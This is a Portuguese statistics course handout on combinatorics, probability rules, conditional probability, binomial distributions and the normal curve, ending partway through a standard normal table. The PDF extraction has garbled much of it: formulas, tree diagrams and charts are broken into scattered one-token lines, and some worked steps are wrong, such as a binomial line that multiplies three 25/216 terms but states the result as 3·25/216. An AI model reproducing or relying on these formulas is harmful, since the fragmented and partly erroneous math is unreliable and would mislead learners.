)!
(
!
2,3
,
=
=
-
=
®
-
=
A
r
m
m
A
r
m
!
1.2.3
].....
3
].[
2
].[
1
.[
m
m
m
m
m
Pm
=
-
-
-
=
!
)!.
(
!
,
r
r
m
m
r
m
C
r
m
-
=
÷÷
ø
ö
çç
è
æ
=

 
 
 
Ex.1: Quantas combinações de dois elementos, podem ser formados com os elementos 
(3, 4, 5, 6)? Prove. 
m=4;   r=2;   
 
Arranjos: (3,4), (3,5), (3,6), (4,3), (4,5), (4,6), (5,3), (5,4), (5,6), (6,3), (6,4), (6,5). 
Combinações: (3,4), (3,5), (3,6), (4,5), (4,6), (5,6). 
 
Ex.2:  M={a, b, c, d} C4,2=? 
Seqüências de 2 elementos (r=2): {(a,b), (a,c), (a,d), (b,a), (b,c), (b,d), (c,a), (c,b), (c,d), 
(d,a), (d,b), (d,c)} 
 
Combinações de 2 elementos (r=2): {(a,b), (a,c), (a,d), (b,c), (b,d), (c,d)} 
 
 
 
PERMUTAÇÕES COM REPETIÇÕES 
 
A quantidade de permutações a partir de elementos repetidos é dada por: 
, sendo n o número de elementos e ni, as quantidades de 
repetições. 
 
Ex.1: A partir do conjunto {4, 4, 4, 5, 5, 6, 6, 6, 6, 7, 8, 8}, quantas permutações podem 
ser obtidas com elementos distintos? 
R.: n=12;   n1(4)=3;   n2(5)=2;   n3(6)=4;   n4(8)=2; 
 
 
Ex.2: Dada a palavra ANALITICA, qual a quantidade de mudança na ordem das letras 
(anagramas) possíveis? 
6
3.2
2
3.4
!2.1.2
!2.3.4
!2
!.
2
!4
!2
)!.
2
4
(
!4
2
4
!
)!.
(
!
,
=
=
=
=
=
-
=
÷÷
ø
ö
çç
è
æ
=
-
=
÷÷
ø
ö
çç
è
æ
=
r
r
m
m
r
m
C
r
m
12
1.2
1.2.3.4
)!
2
4
(
!4
2,4
=
=
-
=
A
6
1.2.1.2
1.2.3.4
!2
)!.
2
4
(
!4
2
4
2
,4
=
=
-
=
÷÷
ø
ö
çç
è
æ
=
C
!
!.....
!.
!.
!
3
2
1
,...,
3
,2
,1
r
nr
n
n
n
n
n
n
n
n
n
P
=
831600
1
1.3.5.7.8.9.
10
.
11
2.
24
.2.6
1.2.3.4.5.6.7.8.9.
10
.
11
.
12
!2
!.
4
!.
2
!.
3
!
12
2,4,2,3
12
=
=
=
=
P

 
 
R.: n=9;   n1(A)=3;   n2(I)=2;   
 
 
5.2- Introdução 
 
A probabilidade está ligada à chance de determinado acontecimento, o qual não pode 
ser previsto com certeza em função variações produzidas pelo acaso. P.ex.: 
- Ter sucesso numa cirurgia; 
- Fazer sol na próxima 2ª-feira; 
- Ações adquiridas se valorizarem na bolsa de valores no próximo mês; 
- Selecionar um produto defeituoso num lote de produtos destinados à vendas; 
- Superar uma meta mensal de vendas; 
- Jogar um dado e obter a face “3”; 
- Gastar menos de 10 minutos numa fila de banco; 
- Ganhar um prêmio num sorteio; 
A probabilidade é a base da Estatística Inferencial. 
 
PRINCIPAIS DEFINIÇÕES: 
-Experimento ou Experimento Aleatório ou Experimento Probabilístico:  é uma ação ou 
ensaio por meio do qual são obtidos resultados específicos. 
-Resultado: desencadeamento de um único experimento probabilístico. 
-Espaço amostral (W): é o conjunto de todos os resultados probabilísticos possíveis para 
um experimento, podendo ser finito ou infinito. 
-Evento: um ou mais resultados do espaço amostral (geralmente designado por uma 
letra maiúscula). 
 
Exemplos: 
 
EX.01:  
Experimento: Lançar 3 dados e registrar os números das faces.  
Espaço amostral: {1,2,3,4,5,6} 
Se: Resultado1={3}, Resultado2={5} e Resultado3={4}  ®  Evento={3, 5, 4} 
30240
1.2
!.
3
!3.4.5.6.7.8.9
!2
!.
3
!9
2,3
9
=
=
=
P

 
 
 
EX.02:  
Experimento: Pegar uma carta de um baralho.  
Espaço amostral: 52 Cartas ® {A©, K©, Q©, J©, 10©,..., 2©, A¨, ..., 2¨, A§, ..., 2§, 
Aª, ..., 2ª} 
Se: Resultado1={7©}  ®  Evento={7©} 
 
EX.03:  
Experimento: Pegar duas cartas de nipe ouros num baralho.  
Espaço amostral: 52 Cartas ® {A©, K©, Q©, J©, 10©,..., 2©, A¨, ..., 2¨, A§, ..., 2§, 
Aª, ..., 2ª} 
Se: Res1={K©}, Res2={K¨}, Res3={3§}, Res4={3ª}, Res5={5¨}  ®  Evento={K¨, 
5¨} 
 
EX.04:  
Experimento: Cronometrar o tempo de ida de um aluno de casa até a escola durante 
uma semana.  
Espaço amostral: {xÎR/0<x<180´} 
Se:  Res1(Seg)={28´}, Res2(Ter)={23´}, Res3(Qua)={25´}, Res4(Qui)={25´}, 
Res5(Sex)={23´}. 
®  Evento = {28´, 23´, 25´, 25´, 23´} 
 
EX.05:  
W: Lançamento de um dado ® W={1, 2, 3, 4, 5, 6} 
A: Obtenção de uma face par ® A={2, 4, 6} 
B: Obtenção de uma face ímpar ® B={1, 3, 5} 
C: Obtenção de uma face maior que 4 ® C={5, 6} 
D: Obtenção de uma face maior que 9 ® D=Æ 
 
EX.06:  
W: Lançamento de uma moeda 3 vezes 

 
 
® W={(Ca,Ca,Ca), (Ca,Ca,Co), (Ca,Co,Ca), (Ca,Co,Co), (Co,Ca,Ca), (Co,Ca,Co), 
(Co,Co,Ca), (Co,Co,Co)} 
A: Cara no segundo lançamento ® A={(Ca,Ca,Ca), (Ca,Ca,Co), (Co,Ca,Ca),  
(Co,Ca,Co)} 
B: Ocorrência de uma só coroa (Co) ® B={(Ca,Ca,Co), (Ca,Co,Ca), (Co,Ca,Ca)} 
C: Ocorrência de tipo único de face ® C={(Ca,Ca,Ca), (Co,Co,Co)} 
 
EX.07:  
W: Lançamento de uma moeda e um dado 
® W={(Ca,1), (Ca,2), (Ca,3), (Ca,4), (Ca,5), (Ca,6), (Co,1), (Co,2), (Co,3), (Co,4), 
(Co,5), (Co,6)} 
A: Dado inferior a 3 ® A={(Ca,1), (Ca,2), (Co,1), (Co,2)} 
 
5.3 PROBABILIDADE EMPÍRICA OU ESTATÍSTICA  
(PE): Baseia-se em observações de experimentos probabilísticos. É numericamente 
igual à frequência relativa deste evento. Assim: 
. 
Ex.: Uma cidade possui 3 tipos de veículos: carros, motos e bicicletas. Faz-se uma 
coleta aleatória de 50 veículos, quando são quantificadas: 30 bicicletas, 15 motos e 5 
carros. A partir disso, define-se a probabilidade de ser obter cada tipo de veículo por: 
P(c)=5/50=10%; P(m)=15/50=30% e P(b)=30/50=60%. 
Obs: Não é conhecido a percentagem real de cada veículo na cidade, logo admite-se 
que ela é igual àquela obtida na amostra (frequência relativa). 
 
 
 
5.4- PROPRIEDADES DA PROBABILIDADE 
 
PROPRIEDADE 1: a probabilidade de um evento possível estará sempre no intervalo 
]0;1] ou ]0;100%]. Se um evento é impossível, a probabilidade dele é zero e, se é certo, 
a probabilidade dele é 1 (100%). Assim: 0£P(E)£1 " E (ou 0£P(E)£100% " E). 
 
n
f
f
f
E
P
E
E
E
=
= å
)
(

 
 
PROPRIEDADE 2: A soma das probabilidades de um espaço amostral é 1 (100%). 
Assim, a probabilidade do complemento (E´) de um evento (E) corresponderá à 
diferença 1-P(E). 
Ex.: 
W = {1, 2, 3, 4, 5} 
E = {1, 2, 3} 
P(E)  = P(1)+P(2)+ P(3)= (1/5)+ (1/5)+ (1/5) = 3/5 = 0,6 = 60%. 
P(E´) = P(4)+P(5)          = (1/5)+ (1/5)            = 2/5 = 0,4 = 40%.  
        (=1-P(E)=1-0,6=0,4=100%-60%=40%) 
Obs-1: (3/5)+(2/5) = 5/5 = 1 = 100% 
Obs-2: 0,6+0,4 = 1 = 100% 
Obs-3: 60%+40% = 100% = 1 
 
PROPRIEDADE 3: Se o evento A está contido no evento B, então a probabilidade de A 
será menor ou igual a probabilidade de B (AÌB®P(A)£P(B)). 
Ex.: 
W = {7, 8, 9, 10, 11, 12} 
E1 = {7, 8, 9, 10} 
E2 = {7, 9} 
P(E1) = P(7)+P(8)+ P(9)+P(10) = (1/6)+ (1/6)+ (1/6)+(1/6) = 4/6 = 2/3 = 0,666...  @ 
60,67%. 
P(E2) = P(7)+P(9) = (1/6)+ (1/6) = 2/6 = 1/3 = 0,333... @ 33,33%. 
Como E2 Ì E1 ® P(E2) £ P(E1) 
 
 
5.4- PROBABILIDADE CONDICIONAL, INDEPENDÊNCIA DE EVENTOS E REGRA 
DA MULTIPLICAÇÃO 
 
PROBABILIDADE CONDICIONAL: é a probabilidade de ocorrer um evento após a 
ocorrência de um outro evento. Pode ser designada por P(B/A), que se lê: 
“Probabilidade de ocorrer B, ocorrido A”. 

 
 
Ex.: Dado o baralho normal de 52 cartas e 4 nipes (Corações: A©, K©, Q©, J©, 10©, 
9©, 8©, 7©, 6©, 5©, 4©, 3©, 2©; Ouros: A¨, K¨, Q¨, J¨, 10¨, 9¨, 8¨, 7¨, 6¨, 5¨, 
4¨, 3¨, 2¨; Paus: A§, K§, Q§, J§, 10§, 9§, 8§, 7§, 6§, 5§, 4§, 3§, 2§; e, Espadas: 
Aª, Kª, Qª, Jª, 10ª, 9ª, 8ª, 7ª, 6ª, 5ª, 4ª, 3ª, 2ª}, duas cartas são retiradas 
aleatoriamente sem recolocação. Determine a probabilidade da segunda carta ser um 
9, dada que a primeira foi um A.  
Solução:  
Na retirada da primeira carta: n(W)=52 ® P("carta)=1/52. 
Na retirada da segunda carta: n(W)=51 (pois n(A)=3) e n(9)=4  ® P(B/A) = 4/51 @ 0,0784 
(=7,84%). 
Logo P(B/A) = 4/51 @ 0,0784 (=7,84%). 
 
 
INDEPENDÊNCIA DE EVENTOS: Dois eventos são independentes se a ocorrência de 
um não afeta a probabilidade de ocorrência do outro, doutra forma os eventos serão 
dependentes. Para se determinar se dois eventos A e B são independentes basta 
calcular ou {P(B), P(B/A)} ou {P(A), P(A/B)}. Se os valores calculados forem iguais os 
eventos serão independentes, do contrário, serão dependentes. 
 
Ex.1: Retirada de um 3 no baralho (A) e, sem reposição, retirada de um 2 (B).  
Solução: 
Seleção de uma carta 2 num baralho completo: P(B)=4/52 
Seleção de uma carta 2 sabendo que já foi retirado um 3: P(B/A)=4/51 
Como P(B)¹P(B/A) os eventos são dependentes 
 
Ex.2: Retirada de um 4 no baralho (A) e, com reposição, retirada de um 3 (B). 
Solução: 
Seleção de uma carta 3 num baralho completo: P(B)=4/52 
Seleção de uma carta 3 num baralho completo (após a retirada e devolução do 4): 
P(B/A)=4/52 
Como P(B)= P(B/A) os eventos são independentes. 
 

 
 
Ex.3: Lançamento de uma moeda com obtenção da face coroa (A) e, na sequência, 
lançamento  de um dado obtendo um 2 (B).  
Solução:  
P(B)=1/6 e P(B/A)=1/6 ® Como P(B)= P(B/A) os eventos são independentes. 
 
Ex.4: Numa urna contendo 4 bolas marrons e 6 bolas vermelhas, retira-se uma bola 
marron (B) e, sem reposição, retira-se uma bola vermelha (A).  
Solução: 
Retirada de 1 bola vermelha: P(A)=6/10 
Retirada de 1 bola vermelha após a retirada sem reposição de uma bola marron: 
P(A/B)=6/9 
Como P(A)¹P(A/B) os eventos são dependentes. 
 
 
REGRA DA MULTIPLICAÇÃO: A probabilidade de dois eventos A e B ocorrerem em 
seqüência é P(A e B) = P(A).P(B/A). Se os eventos forem independentes a probabilidade 
da ocorrência simultânea é P(A e B) = P(A).P(B). A probabilidade P(A e B) também pode 
ser vista como a probabilidade de interseção do evento A com o evento B, sendo 
designada por P(AÇB). 
 
Ex.1: Em um baralho comum, faz-se retiradas sem reposição. Nessas condições, 
determine a probabilidade da retirada de um 2 e, em seguida de um 5.  
Solução: 
P(2e5) ou P(2Ç5)  
P(2Ç5) = P(2).P(5/2) = (4/52).(4/51) = 16/2652 = 0,00603... @ 0,603% 
 
Ex.2: Um lote de produtos contém 50 volumes bons e 10 defeituosos. Um produto é 
escolhido ao acaso e, sem reposição deste, escolhe-se também um segundo 
produto. Determine a probabilidade dos dois produtos serem defeituosos.  
Solução: 
P(D1eD2) ou P(D1ÇD2)  

 
 
 
P(D1ÇD2)=P(D1).P(D2/D1) = (10/60).(9/59) = 90/3540 = 0,0254... @ 2,54% 
 
Ex.3: São jogados uma moeda e um dado. Determine a probabilidade de sair uma 
COROA e a face 3.  
Solução: 
P(CoÇ3)=P(Co).P(3/Co)= P(Co).P(3) = (1/2).(1/6) = 1/12 = 0,0833…@ 8,33% 
 
 
5.5- União de eventos 
 
EVENTOS MUTUAMENTE EXCLUSIVOS: Dois eventos são mutuamente exclusivos se 
nunca puderem ocorrer ao mesmo tempo. 
 
 
Ex1: Jogo de um dado. A: Obtenção de um 3, B: Obtenção de um 4. Como os dois 
eventos não podem ocorrer simultaneamente eles são mutuamente exclusivos. 
 
B
B
B
D
D
D
50/60
49/59
10/59
50/59
9/59
10/60
B
A
A
B
A e B
A e B ® Mutuamente 
Exclusivos
A e B ®  Nao Mutuamente 
Exclusivos

 
 
Ex2: Seleção de um estudante do sexo feminino (A) e que cursa administração de 
empresas (B). Como os dois eventos podem ocorrer simultaneamente eles não são 
mutuamente exclusivos. 
 
 
REGRA DA ADIÇÃO: a probabilidade de ocorrer o evento A ou o evento B é dada por 
P(AouB), sendo expressa por P(AouB) = P(A) + P(B) – P(AÇB). A probabilidade P(A ou 
B) também pode ser designada pela união  P(AUB). 
 
Ex.: No lançamento de um dado, obtenha a probabilidade de obter um número menor 
que 3 ou um número impar. 
Solução: 
P(<3ouIMPAR)=P(<3)+P(IMPAR)-P(<3eIMPAR) 
W:{1, 2, 3, 4, 5, 6} ® n(W)=6 
<3:{1, 2} ® n(<3)=2 
IMPAR: {1, 3, 5} ® n(W)=3 
<3eIMPAR: {1} ® n(W)=1 
P(<3ouIMPAR)= (2/6)+(3/6)-(1/6) = (2+3-1)/6 = 4/6 = 2/3 = 0,6666...@ 0,6667 = 66,67% 
 
Ex.: Um banco de sangue registra o seguinte quadro de doações a seguir. Determine: 
1) A probabilidade de um doador ter tipo O ou A de sangue; 2) A probabilidade do doador 
ser do tipo B ou ser Negativo. 
Soluções: 
1) 
P(OouA) 
= 
P(O)+P(A)-P(OeA) 
= 
P(O)+P(A) 
= 
(184/409) 
+ 
(164/409) 
=348/409 @ 0,8509. 
2) P(BouNEG) = P(B)+P(NEG)-P(B-NEG) = (45/409) + (65/409) – (8/409) = (45+65-
8)/409 = 102/409  @ 0,2494. 
 
A
B
A e B
A
P(A)
B
P(B)
P(AeB)
 
O 
A 
B 
AB 
TOTAL 
Rh: Positivo 
156 
139 
37 
12 
344 
Rh: Negativo 
28 
25 
8 
4 
65 
TOTAL 
184 
164 
45 
16 
409 
  
 
 

 
 
 
5.6- Distribuição de Probabilidade 
 
Antes de introduzir o conceito de distribuição de probabilidade precisamos definir 
variável aleatória. 
 
5.6.1.Variável Aleatória 
 
 valor associado a cada resultado de um experimento. Pode ser discreta ou contínua. 
VARIÁVEL ALEATÓRIA DISCRETA: se os resultados são obtidos por contagem; 
Ex.1: Número de ligações diárias recebidas por um atendente de um Call Center; 
Ex.2: Quantidade de alunos que fazem as provas finais numa IES por semestre; 
 
VARIÁVEL ALEATÓRIA CONTÍNUA: se os resultados são obtidos por medição (eixo 
real); 
Ex.1: Duração média das ligações diárias recebidas por um atendente de um Call 
Center; 
Ex.2: Duração das provas finais dos alunos em cada disciplina; 
 
As distribuições de probabilidades são associações ordenadas entre os valores das 
variáveis aleatórias e as respectivas probabilidades. As distribuições têm as seguintes 
propriedades: 0 ≤ P(x) ≤ 1  e  åP(x) = 1.  
Ex.1: 
x 
10 
12 
17 
19 
30 
P(x) 
0,2237 0,0018 0,4782 0,5556 0,1111 
Não é dist. de probabilidade ® SP(x)= 0,2237+0,0018+0,4782+0,5556+0,1111 
=1,3704 >>>1 
Ex.2: 
y 
3 
4 
7 
9 
10 
11 
P(y) 
0,21 
0,19 
0,08 
0,13 
0,16 
0,23 
É dist. de probabilidade ® SP(y)=0,21+0,19+0,08+0,13+0,16+0,23=1 e  0≤P(y)≤1 / 
"y  

 
 
Ex.3: 
z 
8 
10 
12 
14 
P(y) 
0,25 
1,02 
0,11 
0,07 
Não é distribuição de probabilidade ® P(10)=1,02>1  
 
 
5.6.2- DISTRIBUIÇÕES DISCRETAS DE PROBABILIDADES 
 
Considerando-se que a associação entre frequência relativa e probabilidade 
(probabilidade empírica), as distribuições discretas de probabilidades podem ser 
representadas por histogramas de frequências relativas. 
 
Ex.: Considerando-se os números de acidentes diários com motos, 
o órgão de trânsito de uma cidade apresenta os dados da tabela 
(acidentes diários versus frequência) para um período de análise. 
A partir da tabela (n = Sf = 9+6+32+22+7 = 76), são determinadas 
as seguintes frequências relativas: fr(8) = 9/76 @ 0,1184;   fr(12) = 
6/76 @ 0,0789;   fr(23) = 32/76 @ 0,4211;   fr(31) = 22/76 @ 0,2895;   
e, fr(44) = 7/76 @ 0,0921. (OBS: Sf = 0,1184 + 0,0789 + 0,4211 + 0,2895 + 0,0921 = 1). 
Logo, estão também determinadas as probabilidades, como mostra a tabela a seguir, 
para a qual segue esboçado o histograma de frequências relativas (distribuição discreta 
de probabilidades). 
 
 
  
 
 
5.6.3- Distribuição Binomial 
 
EXPERIMENTOS BINOMIAIS: São experimentos onde cada tentativa pode resultar em 
apenas dois tipos de resultado: favorável a uma proposição (sucesso) e desfavorável a 
Acidentes 
diários 
f 
8 
9 
12 
6 
23 
32 
31 
22 
44 
7 
 
Acidentes 
diários 
f 
fr (=P) 
8 
9 
0,1184 
12 
6 
0,0789 
23 
32 
0,4211 
31 
22 
0,2895 
44 
7 
0,0921 
S 
76 
1,000 
 
 

 
 
uma proposição (fracasso). Ex.: Um atirador que mira um alvo tem apenas duas 
possibilidades: acertar ou errar. 
 
REQUISITO DOS EXPERIMENTOS BINOMIAIS: Todo experimento binomial precisa 
preencher os seguintes requisitos: a) ser repetido por um número fixo de vezes onde 
cada repetição é independente; b) ter somente dois resultados possíveis; c) ter a mesma 
probabilidade de sucesso em cada tentativa; e, d) ter a variável aleatória contando o 
número de tentativas de sucesso. 
FÓRMULA DA PROBABILIDADE BINOMIAL: 
.   Sendo: n ® número de repetições;   p ® probabilidade 
de sucesso de uma tentativa;   q ® probabilidade de fracasso de uma tentativa (q=1-p);   
x (= 1, 2, 3, ....n) ® variável aleatória que representa o número de sucessos. 
 
MÉDIA, VARIÂNCIA E DESVIO-PADRÃO DA DISTRIBUIÇÃO BINOMIAL: 
Valor Esperado (Média): 
;   Variância: 
 
 
Ex.1: Um dado é lançado 3 vezes. Obtenha a probabilidade de sair apenas uma face 5. 
n=3;   p=1/6;   q=5/6;   x=1   ® É um experimento binomial (sucesso = 1 face 5). 
 
x
n
x
x
n
x
x
n
q
p
x
x
n
n
q
p
C
x
P
-
-
-
=
=
!
)!
(
!
)
(
,
np
x
E
=
= µ
)
(
npq
=
2
s

 
 
 
 
P(1) = (25/216).(25/216).(25/216) = 3.25/216 @ 0,3472. (Probabilidade de apenas 1 
sucesso) 
OBS.: n=3, x=1, p=1/6 e q=5/6 
 
 ®  
 
 
Ex.2: Uma sondagem revela a intenção de voto dos eleitores para 6 candidatos, como 
mostra a tabela lateral. Sabendo que 5 candidatos foram 
entrevistados, monte a distribuição de probabilidade para aqueles que 
votariam no candidato D. (OBS.: n=5; x=0,5; p=0,11; q=1-0,11=0,89). 
1/6
5/6
1/6
1/6
1/6
1/6
1/6
1/6
5/6
5/6
5/6
5/6
5/6
5/6
1/6
1/6
1/6
1/6
1/6
1/6
1/6
1/6
1/6
1/6
1/6
1/6
5/6
5/6
5/6
5/6
5/6
5/6
5/6
5/6
5/6
5/6
5/6
5/6
P(5,5,5) =  (1/6).(1/6).(1/6) = 1/216
P(5,5,-) =  (1/6).(1/6).(5/6) = 5/216
P(5,-,5) =  (1/6).(5/6).(1/6) = 5/216
P(5,-,-) =  (1/6).(5/6).(5/6) = 25/216
P(-,5,5) =  (5/6).(1/6).(1/6) = 5/216
P(-,5,-) =  (5/6).(1/6).(5/6) = 25/216
P(-,-,5) =  (5/6).(5/6).(1/6) = 25/216
P(-,-,-) =  (5/6).(5/6).(5/6) = 125/216
3
X
2
2
1
2
1
1
0
x
n
xq
p
x
x
n
n
x
P
-
-
=
!
)!
(
!
)
(
3472
,0
72
25
36
25
6
1
.3
6
5
6
1
!1
)!
1
3(
!3
)1(
1
3
1
@
=
÷
ø
ö
ç
è
æ÷
ø
ö
ç
è
æ
=
÷
ø
ö
ç
è
æ
÷
ø
ö
ç
è
æ
-
=
-
P
Candidato 
Intenção 
A 
32 % 
B 
30 % 
C 
22 % 
D 
11 % 
E 
4 % 
F 
1 % 
 

 
 
 
 
 
 
 
 
 
Ex.3: Uma inspeção indica que 39% das residências de uma cidade estão infectadas 
com o mosquito transmissor da dengue. Selecionando-se 6 casas ao acaso, obtenha: 
a) a distribuição de probabilidades e o respectivo gráfico; b) a probabilidade de 
exatamente 4 casas estares infectadas; c) a probabilidade de ao menos 3 casas estarem 
infectadas; d) a probabilidade de até 2 casas estarem infectadas; e) a probabilidade de 
menos que 3 casas estarem infectadas; f) o valor esperado de casas infectadas; g) a 
variância de casas infectadas; e, h) o desvio-padrão de casas infectadas. (OBS.: n=6; 
x=0..6; p=0,39; q=1-0,39=0,61; 
); 
a) 
 
 
 
 
 
 
 
x
n
xq
p
x
x
n
n
x
P
-
-
=
!
)!
(
!
)
(
558406
,0
558406
,0.1.1
89
,0.
11
,0
]}.
!0
)!.
0
5
/[(
!5
{
)0(
0
5
0
@
@
-
=
-
P
345082
,0
627422
,0.
11
,0.5
89
,0.
11
,0
]}.
!1
)!.
1
5
/[(
!5
{
)1(
1
5
1
@
@
-
=
-
P
085301
,0
704969
,0.
0121
,0.
10
89
,0.
11
,0
]}.
!2
)!.
2
5
/[(
!5
{
)2(
2
5
2
@
@
-
=
-
P
010543
,0
792100
,0.
001331
,0.
10
89
,0.
11
,0
]}.
!3
)!.
3
5
/[(
!5
{
)3(
3
5
3
@
@
-
=
-
P
000652
,0
89
,0.
000146
,0.5
89
,0.
11
,0
]}.
!4
)!.
4
5
/[(
!5
{
)4(
4
5
4
@
@
-
=
-
P
000016
,0
1.
000016
,0.1
89
,0.
11
,0
]}.
!5
)!.
5
5
/[(
!5
{
)5(
5
5
5
@
@
-
=
-
P
x
n
xq
p
x
x
n
n
x
P
-
-
=
!
)!
(
!
)
(
051520
,0
051520
,0.1.1
61
,0.
39
,0
]}.
!0
)!.
0
6
/[(
!6
{
)0(
0
6
0
@
@
-
=
-
P
197636
,0
084460
,0.
39
,0.6
61
,0.
39
,0
]}.
!1
)!.
1
6
/[(
!6
{
)1(
1
6
1
@
@
-
=
-
P
315893
,0
138458
,0.
1521
,0.
15
61
,0.
39
,0
]}.
!2
)!.
2
6
/[(
!6
{
)2(
2
6
2
@
@
-
=
-
P
269286
,0
226981
,0.
059319
,0.
20
61
,0.
39
,0
]}.
!3
)!.
3
6
/[(
!6
{
)3(
3
6
3
@
@
-
=
-
P
129125
,0
3721
,0.
023134
,0.
15
61
,0.
39
,0
]}.
!4
)!.
4
6
/[(
!6
{
)4(
4
6
4
@
@
-
=
-
P
033022
,0
61
,0.
009022
,0.6
61
,0.
39
,0
]}.
!5
)!.
5
6
/[(
!6
{
)5(
5
6
5
@
@
-
=
-
P
003519
,0
1.
003519
,0.1
61
,0.
39
,0
]}.
!6
)!.
6
6
/[(
!6
{
)6(
6
6
6
@
@
-
=
-
P
Distribuição 
x 
P(x) 
0 
0,558406 
1 
0,345082 
2 
0,085301 
3 
0,010543 
4 
0,000652 
5 
0,000016 
S 
1,000000 
 
Distribuição 
x 
P(x) 
0 
0,051520 
1 
0,197636 
2 
0,315893 
3 
0,269286 
4 
0,129125 
5 
0,033022 
6 
0,003519 
S 
1,000001 
 
 
0
3
0
1
2
4
5
6
1
3
4
5
2
0
2
3
31,59%
x versus P
P
x
4
5
6
1

 
 
 
 
 
 
 
 
 
 
 
b) P(4) @ 0,129125 @ 12,91% 
c) P(>=3) = P(3)+P(4)+P(5)+P(6) @ 0,269286+0,129125+0,033022+0,003519 = 
0,434952 @ 43,50%  
d) P(<=2) = P(0)+P(1)+P(2) @ 0,051520+0,197636+0,315893 = 0,565049 @ 56,50% 
e) P(<3) = P(0)+P(1)+P(2) @ 56,50% 
f) Valor Esperado E(x) = n.p = 6.0,39 = 2,34 casas infectadas 
g) Variância = n.p.q = 6.0,39.0,61 =  1,4274 casas infectadas2 
h) Desvio-Padrão = Raiz(Variância) = 1,4274^0,5  @ 1,1947 casas infectadas 
 
 
5.6.4- DISTRIBUIÇÕES CONTÍNUAS 
 
As distribuições contínuas de probabilidade mais comuns são as seguintes: Uniforme, 
Exponencial, Gama, Weibull, Normal, LogNormal, Beta e Triangular. Dentre estas 
destacamos a Distribuição Normal, que pode ser amplamente empregada em problemas 
de administração e que será a única estudada neste curso.  
As propriedades da distribuição normal são:  
a) a média aritmética, mediana e moda são iguais;  
b) é representada por uma curva que tem formato de sino sendo simétrica em torno da 
média, denominada de Curva Normal, como mostra a figura a seguir;  
c) 
a 
curva 
característica 
(Curva 
Normal) 
é 
definida 
pela 
equação: 
,  
p
s
s
µ
2
)
(
2
2
2
/
)
( -
-
=
=
=
=
x
e
y
x
f
fdp
Densidade
Cotas (B=6; H=4,8) 
x 
P(x) 
Cotas 
0 
0,051520 
0,78 
1 
0,197636 
3,00 
2 
0,315893 
4,80 
3 
0,269286 
4,09 
4 
0,129125 
1,96 
5 
0,033022 
0,50 
6 
0,003519 
0,05 
S 
1,000001 
 
 

 
 
d) A área sob a curva Normal é igual à unidade;  
f) A curva Normal se aproxima do eixo das abscissas sem nunca toca-lo (é assintótica 
em relação ao eixo das abscissas);  
 
 
 
 
 
 
 
 
 
 
 
 
 
Uma observação importante sobre o comportamento da curva Normal, é que quanto 
maior o desvio-padrão da distribuição, mais alargada será a curva em relação ao eixo 
definido pela média. Assim: 
 
 
 
 
Média=2,3  e  Desvio-
Padrão=0,7 
Média=4,6  e  Desvio-
Padrão=0,7 
Média=4,6  e  Desvio-
Padrão=2,4 
 
 
 
µ-s
µ
µ-2s
µ-3s
µ+s
µ+2s
µ+3s
x
A
f(x)
µ-4s
µ+4s

 
 
 
 
Sendo a área total sob a curva Normal igual à unidade, a 
área de uma região sob a curva Normal será a 
probabilidade da variável aleatória se situar no intervalo 
correspondente. Assim, a probabilidade de um valor x 
estar entre as abscissas “a” e “b” da curva Normal, será 
numericamente igual à respectiva área delimitada pela curva Normal e os seguimentos 
verticais que passam por esses valores. Assim: 
. Não existe 
probabilidade, em variáveis aleatórias contínuas, para valores específicos, apenas para 
intervalos. 
 
Uma observação importante sobre as probabilidades e a curva Normal é que, como 
mostrado na figura a seguir: 
 
 
 
 
 
 
 
Assim, conhecendo-se as áreas correspondentes a todos os intervalos de abscissas, é 
possível a determinação de todas as probabilidades a partir da curva Normal. 
O cálculo utilizado para determinar a área da curva para cada valor de média e desvio 
padrão não é “fácil”, por isso utilizamos a Distribuição Normal padrão. 
 
A curva Normal padronizada é aquela obtida considerando-se a média igual a zero e o 
desvio-padrão igual a 1. A correlação entre a curva normal de um dado problema e a 
curva Normal padronizada é obtida calculando-se um escore (z). O escore é uma 
medida de posição dada nas unidades de  desvio-padrão (quantidade de desvios-
A
b
x
a
P
=
£
£
)
(
%
68
68269
,0
341345
,0.2
341345
,0
341345
,0
))
(
)
((
@
=
=
+
@
+
á
á
-
s
µ
s
µ
x
P
%
95
954500
,0
)
135905
,0
341345
,0
.(
2
))
2
(
)
2
((
@
=
+
@
+
á
á
-
s
µ
s
µ
x
P
%
7,
99
997300
,0
)
021400
,0
135905
,0
341345
,0
(
2
))
3
(
)
3
((
@
=
+
+
@
+
á
á
-
s
µ
s
µ
x
P
 
µ
x
fdp
a
b
A
 
µ
x
fdp
µ-1s
µ+1s
µ-2s
µ-3s
µ+2s
µ+3s
0,341345
0,341345
0,135905
0,135905
0,021400
0,021400

 
 
padrão em relação à média), sendo: 
. Na curva Normal 
padronizada, quando z=0 a área englobada corresponde a 0,5, sendo que a área total 
sob a curva, como na curva Normal, continua igual à unidade.  
 
 
ÁREAS ACUMULADAS NA CURVA NORMAL PADRÃO (-5,00 < z < 5,00)  
 
A partir das tabelas acima, é possível obter uma área acumulada até um 
valor de determinado escore z. Este valor de z deve ser composto 
somando-se os valores da primeira coluna com os valores da primeira 
linha. 
 
 
 
 
 
s
µ
-
=
-
-
=
x
padrao
desvio
media
valor
z
Z
0,00
0,01
0,02
0,03
0,04
0,05
0,06
0,07
0,08
0,09
-5,00
0,000000
0,000000
0,000000
0,000000
0,000000
0,000000
0,000000
0,000000
0,000000
0,000000
-4,90
0,000000
0,000001
0,000001
0,000001
0,000001
0,000001
0,000001
0,000001
0,000001
0,000001
-4,80
0,000001
0,000001
0,000001
0,000001
0,000001
0,000001
0,000001
0,000001
0,000001
0,000001
-4,70
0,000001
0,000001
0,000001
0,000002
0,000002
0,000002
0,000002
0,000002
0,000002
0,000002
-4,60
0,000002
0,000002
0,000002
0,000002
0,000003
0,000003
0,000003
0,000003
0,000003
0,000003
-4,50
0,000003
0,000004
0,000004
0,000004
0,000004
0,000004
0,000004
0,000005
0,000005
0,000005
-4,40
0,000005
0,000006
0,000006
0,000006
0,000007
0,000007
0,000007
0,000007
0,000008
0,000008
-4,30
0,000009
0,000009
0,000009
0,000010
0,000010
0,000011
0,000011
0,000012
0,000012
0,000013
-4,20
0,000013
0,000014
0,000015
0,000015
0,000016
0,000017
0,000017
0,000018
0,000019
0,000020
-4,10
0,000021
0,000022
0,000023
0,000024
0,000025
0,000026
0,000027
0,000028
0,000029
0,000030
-4,00
0,000032
0,000033
0,000034
0,000036
0,000037
0,000039
0,000041
0,000042
0,000044
0,000046
-3,90
0,000048
0,000050
0,000052
0,000054
0,000057
0,000059
0,000062
0,000064
0,000067
0,000069
-3,80
0,000072
0,000075
0,000078
0,000082
